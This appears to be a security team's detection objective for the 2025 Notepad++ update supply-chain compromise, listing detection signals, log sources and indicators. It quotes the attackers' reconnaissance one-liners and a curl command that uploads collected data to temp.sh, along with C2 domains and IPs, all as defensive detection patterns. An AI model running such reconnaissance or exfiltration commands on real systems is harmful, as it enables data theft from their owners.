# Detect Notepad++ Supply Chain Compromise Activity

## Metadata

- **UUID**: `3e8b5d7f-9c2a-4f6e-8b1d-7a4c9e3f6b2d`
- **Schema**: `objective::1.0`
- **Version**: `1`
- **Created**: `2026-02-09`
- **Modified**: `2026-02-09`
- **TLP**: clear (`TLP:CLEAR`)
- **Organisation**: EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`)

## References
### Public
- **1**: [https://securelist.com/notepad-supply-chain-attack/115382/](https://securelist.com/notepad-supply-chain-attack/115382/)
- **2**: [https://www.rapid7.com/blog/post/2026/02/03/notepad-plus-plus-supply-chain-compromise/](https://www.rapid7.com/blog/post/2026/02/03/notepad-plus-plus-supply-chain-compromise/)

## Description
This detection objective addresses the sophisticated supply chain compromise
of Notepad++ update infrastructure that occurred between July and October 2025,
affecting organizations across multiple sectors and geographic regions.

The attack involved compromised update servers distributing malicious NSIS
installers through the legitimate GUP.exe updater, deploying three distinct
infection chains with varying execution techniques including ProShow vulnerability
exploitation, Lua interpreter abuse, and DLL side-loading.

Detection focuses on identifying the characteristic behaviors across all infection
chains: suspicious NSIS installer execution from update processes, system
reconnaissance command sequences, data exfiltration to legitimate web services
(temp.sh), abuse of legitimate executables for malicious code execution, and
communication with known Cobalt Strike C2 infrastructure.

Due to the critical nature of supply chain attacks and their potential for
widespread impact, this objective is assigned Critical priority with High
investment requirements for comprehensive detection coverage.

## Objective metadata

- **Priority**: Critical
- **Type**: Threat
- **Investment**: Significant
- **Composition**: Combined
- **Composition rationale**: The detection strategy employs correlation across multiple behavioral signals
to identify Notepad++ supply chain compromise activity while minimizing false
positives from legitimate software operations.

Primary detection approach focuses on:

1. **Initial Delivery Indicators**: Monitoring NSIS installer behavior launched
   from Notepad++ update components (GUP.exe), including temporary directory
   creation patterns and installer execution from unusual locations.

2. **Discovery Phase Correlation**: Detecting sequences of system reconnaissance
   commands (whoami, tasklist, systeminfo, netstat) executed in close temporal
   proximity, particularly when originating from unusual parent processes or
   AppData subdirectories.

3. **Exfiltration Detection**: Identifying data uploads to temp.sh service and
   monitoring for suspicious User-Agent header patterns that may encode URLs
   to exfiltrated data.

4. **Execution Technique Indicators**: Detecting abuse of legitimate software
   (ProShow.exe, Lua interpreters, BluetoothService.exe) loaded from unusual
   AppData locations with suspicious accompanying files (load, alien.ini, log.dll).

5. **C2 Communication**: Network-based detection of communication with known
   malicious infrastructure domains and IP addresses associated with Cobalt
   Strike beacons.

Correlation rules should combine multiple signals across different attack phases
to achieve high-fidelity detection. For example, NSIS installer execution from
GUP.exe followed within 30 minutes by reconnaissance commands and data exfiltration
to temp.sh provides strong indicator of compromise.

The strategy balances host-based behavioral detection with network-based IOC
matching to provide defense-in-depth coverage across the attack lifecycle.

## Signals
### NSIS Installer Deployment from Notepad++ Updater
Detects the execution of NSIS (Nullsoft Scriptable Install System) installers
launched by GUP.exe, the legitimate Notepad++ update component. The malicious
update payloads are NSIS installers ranging from 140KB to 1MB that create
temporary directories and deploy malicious components.

Detection focuses on:
- GUP.exe spawning processes that create or access NSIS temporary directories
  (typically named $PLUGINSDIR or ns.tmp)
- Execution of update.exe, install.exe, or AutoUpdater.exe from unusual locations
- NSIS installer execution that subsequently creates suspicious subdirectories
  in %APPDATA% (ProShow, Adobe\Scripts, Bluetooth)
- File writes to these directories including executable files and supporting
  payloads (load, alien.ini, log.dll, etc.)

This signal provides early detection at the initial deployment phase before
reconnaissance or C2 establishment occurs.

- **Severity**: High
- **Methodology**: Pattern Matching
- **Effort**: 2
#### Data

- **Availability**: Partial
- **Requirements**: - Process execution logs with parent-child relationships
- Process command line arguments
- File creation events in user AppData directories
- NSIS installer detection (process name patterns, file signatures)

Preferred log sources:
- Sysmon Event IDs 1 (Process Create), 11 (File Create)
- EDR process telemetry
- Windows Event ID 4688 (Process Creation) with command line logging enabled
- **Entities**: Process, Command Line, File, Hostname
### System Reconnaissance Commands Following Software Update
Detects sequences of system reconnaissance commands characteristic of the
Notepad++ supply chain attack discovery phase. Attackers executed combinations
of whoami, tasklist, systeminfo, and netstat -ano commands to profile victim
systems.

Detection criteria:
- Execution of 2 or more discovery commands within a 5-minute window
- Commands launched from suspicious parent processes or unusual working directories
- Specific command patterns observed in attack:
  * "cmd /c whoami&&tasklist > 1.txt" (Chain #1)
  * "cmd /c whoami&&tasklist&&systeminfo&&netstat -ano > a.txt" (Chain #2)
- Output redirection to files in suspicious AppData subdirectories:
  * %appdata%\ProShow\
  * %APPDATA%\Adobe\Scripts\
  * %appdata%\Bluetooth\

Behavioral correlation should consider:
- Temporal proximity to NSIS installer execution
- Parent process legitimacy (suspicious if from AppData)
- Working directory location
- Output file naming patterns (1.txt, a.txt)

- **Severity**: Medium
- **Methodology**: Behavioural
- **Effort**: 3
#### Data

- **Availability**: Complete
- **Requirements**: - Process execution logs with command line arguments
- Process parent-child relationships
- Process working directory information
- File creation events for output files
- Temporal correlation capability (sliding time windows)

Preferred log sources:
- Sysmon Event ID 1 (Process Create) with command line
- EDR process telemetry
- Windows Event ID 4688 with command line auditing
- PowerShell Script Block Logging (if PowerShell variants used)
- **Entities**: Process, Command Line, File, Hostname, User
### Data Exfiltration to temp.sh Web Service
Detects data exfiltration to the temp.sh temporary file sharing service,
used by attackers to stage reconnaissance data and avoid direct C2 communication.
The technique involves uploading system information to temp.sh and transmitting
the resulting URL to C2 infrastructure via User-Agent headers.

Detection approaches:

Network-based:
- DNS queries for temp.sh or temp[.]sh domain
- HTTP/HTTPS POST requests to temp.sh with file upload content
- Outbound connections to temp.sh IP addresses
- Suspicious User-Agent headers containing temp.sh URLs
  (e.g., "Mozilla/5.0 (https://temp.sh/xxxxx)")

Host-based:
- Execution of curl.exe or similar HTTP tools with temp.sh in arguments
- Command lines containing: "curl", "temp.sh", and file paths
- Example: "curl -F file=@1.txt https://temp.sh"

Context enrichment:
- Temporal correlation with reconnaissance command execution
- Source file locations in suspicious AppData subdirectories
- Parent process analysis (suspicious if from AppData executables)

This signal is high severity due to confirmed data exfiltration activity
and direct linkage to the attack campaign.

- **Severity**: High
- **Methodology**: Pattern Matching
- **Effort**: 2
#### Data

- **Availability**: Partial
- **Requirements**: - DNS query logs
- HTTP/HTTPS proxy logs with URL and User-Agent headers
- Network connection logs
- Process execution logs with command line arguments
- EDR network telemetry

Preferred log sources:
- DNS server logs or endpoint DNS query logs
- Web proxy logs (Zscaler, Palo Alto, etc.)
- Firewall logs with HTTPS inspection
- Sysmon Event ID 1 (Process Create) and Event ID 3 (Network Connection)
- EDR network telemetry
- **Entities**: Domain, URL, IP Address, Process, Hostname
### Suspicious DLL Side-Loading and Exploit-Based Execution
Detects malicious execution via legitimate software abuse, including DLL
side-loading and exploitation of vulnerable legitimate executables. The
Notepad++ campaign employed three distinct execution techniques across
infection chains.

Detection signatures:

1. **ProShow Exploitation (Chain #1)**:
   - ProShow.exe execution from %appdata%\ProShow\
   - Presence of "load" file (no extension) in same directory
   - ProShow.exe not in legitimate program installation paths

2. **Lua Interpreter Abuse (Chain #2)**:
   - lua.exe or script.exe execution from %APPDATA%\Adobe\Scripts\
   - Presence of alien.ini file (compiled Lua script)
   - API call patterns: EnumWindowStationsW invoked by Lua interpreter
   - Memory allocation patterns consistent with shellcode loading

3. **BluetoothService DLL Side-Loading (Chain #3)**:
   - BluetoothService.exe execution from %appdata%\Bluetooth\
   - log.dll loaded from same directory (not from System32)
   - Presence of "BluetoothService" file without extension (encrypted payload)
   - Unsigned or suspicious DLL loaded by signed executable

Common indicators across all techniques:
- Legitimate executables running from unusual AppData subdirectories
- Accompanying suspicious files (load, alien.ini, log.dll, encrypted payloads)
- Process creation from AppData locations not typical for legitimate software
- Module load events showing DLLs loaded from non-standard paths

High severity due to active exploitation and malicious code execution.

- **Severity**: High
- **Methodology**: Pattern Matching
- **Effort**: 3
#### Data

- **Availability**: Partial
- **Requirements**: - Process execution logs with full file paths
- DLL/module load events
- File creation events in AppData directories
- Image signature verification logs
- API call monitoring (for advanced detection)
- Memory allocation events (EDR-specific)

Preferred log sources:
- Sysmon Event ID 1 (Process Create), Event ID 7 (Image/DLL Load),
  Event ID 11 (File Create)
- EDR process and module loading telemetry
- Windows Event ID 4688 (Process Creation)
- Windows Defender ATP / Microsoft Defender for Endpoint
- **Entities**: Process, File, Software, Hostname
### Cobalt Strike Beacon C2 Communication
Detects network communication to known Cobalt Strike C2 infrastructure
associated with the Notepad++ supply chain campaign. All observed infection
chains ultimately deployed Cobalt Strike Beacon as the primary post-compromise
C2 implant.

Network indicators:

**Known C2 Domains**:
- cdncheck.it[.]com (Chain #1, July-August 2025)
- self-dns.it[.]com (Chain #2, September-October 2025)
- safe-dns.it[.]com (Chain #2, September-October 2025)
- api.wiresguard[.]com (Chain #3, October 2025)
- api.skycloudcenter[.]com (observed in later variants)

**Download Infrastructure IPs**:
- 45.77.31[.]210 (Cobalt Strike download: /users/admin)
- 45.76.155[.]202 (update.exe distribution)
- 45.32.144[.]255 (update.exe distribution)
- 95.179.213[.]0 (update.exe, install.exe, AutoUpdater.exe)

Detection criteria:
- DNS queries or resolutions for listed domains
- Outbound HTTPS (443) connections to listed domains/IPs
- HTTP GET requests to paths like /users/admin or /update/*
- TLS SNI fields matching C2 domains
- Beacon-like traffic patterns: periodic HTTPS requests with consistent intervals

**Behavioral indicators**:
- Regular HTTPS beaconing from endpoints at fixed intervals (jitter may be present)
- Outbound connections to domains mimicking legitimate services (CDN, DNS, VPN)
- POST requests with encrypted payloads following GET requests
- Network activity from processes executing from AppData directories

**Configuration artifacts**:
- XOR-encrypted Cobalt Strike configuration with key "CRAZY"
- Memory strings matching listed domains in suspicious processes

Critical severity due to confirmed C2 channel establishment indicating
active compromise and ongoing threat actor access to the environment.

- **Severity**: Critical
- **Methodology**: Pattern Matching
- **Effort**: 2
#### Data

- **Availability**: Complete
- **Requirements**: - DNS query logs with timestamps
- Network connection logs (firewall, proxy, NGFW)
- HTTP/HTTPS logs with URLs and TLS SNI information
- NetFlow or connection metadata for beacon detection
- EDR network telemetry
- IDS/IPS logs
- TLS certificate inspection logs

Preferred log sources:
- DNS server logs or endpoint DNS query logs
- Firewall logs (Palo Alto, Fortinet, Cisco ASA/FTD)
- Web proxy logs with HTTPS inspection
- Zeek/Bro network security monitor
- Sysmon Event ID 3 (Network Connection)
- IDS/IPS alerts (Snort, Suricata)
- **Entities**: Domain, IP Address, URL, Network Connection, Process, Hostname

## Signal MDR coverage
| Signal | Downstream MDR rules |
| --- | --- |
| NSIS Installer Deployment from Notepad++ Updater | _None_ |
| System Reconnaissance Commands Following Software Update | _None_ |
| Data Exfiltration to temp.sh Web Service | _None_ |
| Suspicious DLL Side-Loading and Exploit-Based Execution | _None_ |
| Cobalt Strike Beacon C2 Communication | _None_ |

## Relations

```mermaid
flowchart TB
subgraph "Signal"
2f7c9b4e_8d3a_4e6f_9b1c_7a5d8e2f4b6c["2f7c9b4e-8d3a-4e6f-9b1c-7a5d8e2f4b6c"]
4e7b9d3f_6c2a_4e8f_9b1d_7a5c8e3f6b2d["4e7b9d3f-6c2a-4e8f-9b1d-7a5c8e3f6b2d"]
6c9f3e7b_4d2a_4e8f_9b6d_3a7c5e1f8b4d["6c9f3e7b-4d2a-4e8f-9b6d-3a7c5e1f8b4d"]
8d4f6b2e_9c7a_4e1f_8b3d_6a9c5e7f2b4d["8d4f6b2e-9c7a-4e1f-8b3d-6a9c5e7f2b4d"]
9b6e4d8f_7c3a_4e2f_8b1d_6a9c5e7f3b4d["9b6e4d8f-7c3a-4e2f-8b1d-6a9c5e7f3b4d"]
end
subgraph "Threat"
23d06aa7_f6d5_44ee_be8f_e6de2f495bd9["ProShow vulnerability exploitation for payload delivery"]
52462685_bebb_4e86_94b0_fd46aeacb085["Malicious NSIS installer deployment"]
55eaa437_5a25_4c29_b1fc_9c0fba4a18ad["Registry autorun persistence from temporary folders"]
7c4d9a2e_8f3b_4e6a_9d1c_5a7b8e2f4d3a["Cobalt Strike Beacon deployment via Metasploit downloader"]
8b7cae6f_b6cf_4414_9cdc_fe8c8ee7ee22["Notepad++ supply chain attack"]
bc365789_bdbb_4e78_b2ae_b097a7ccd35f["Lua interpreter shellcode execution"]
bc95c747_ede2_4c16_a6b4_506b305e744a["Chrysalis backdoor deployment via DLL sideloading"]
bee6e973_b0d0_4735_a26a_003f39b8c08d["System reconnaissance via shell commands in supply chain attack"]
bf30d882_9b96_403a_9a47_83a2981fc526["LOLC2 service abuse via temp.sh"]
end
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d["Detect Notepad++ Supply Chain Compromise Activity"]
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|signal| 2f7c9b4e_8d3a_4e6f_9b1c_7a5d8e2f4b6c
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|signal| 4e7b9d3f_6c2a_4e8f_9b1d_7a5c8e3f6b2d
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|signal| 6c9f3e7b_4d2a_4e8f_9b6d_3a7c5e1f8b4d
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|signal| 8d4f6b2e_9c7a_4e1f_8b3d_6a9c5e7f2b4d
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|signal| 9b6e4d8f_7c3a_4e2f_8b1d_6a9c5e7f3b4d
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| 23d06aa7_f6d5_44ee_be8f_e6de2f495bd9
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| 52462685_bebb_4e86_94b0_fd46aeacb085
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| 55eaa437_5a25_4c29_b1fc_9c0fba4a18ad
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| 7c4d9a2e_8f3b_4e6a_9d1c_5a7b8e2f4d3a
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| 8b7cae6f_b6cf_4414_9cdc_fe8c8ee7ee22
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| bc365789_bdbb_4e78_b2ae_b097a7ccd35f
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| bc95c747_ede2_4c16_a6b4_506b305e744a
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| bee6e973_b0d0_4735_a26a_003f39b8c08d
3e8b5d7f_9c2a_4f6e_8b1d_7a4c9e3f6b2d -->|threat| bf30d882_9b96_403a_9a47_83a2981fc526
```

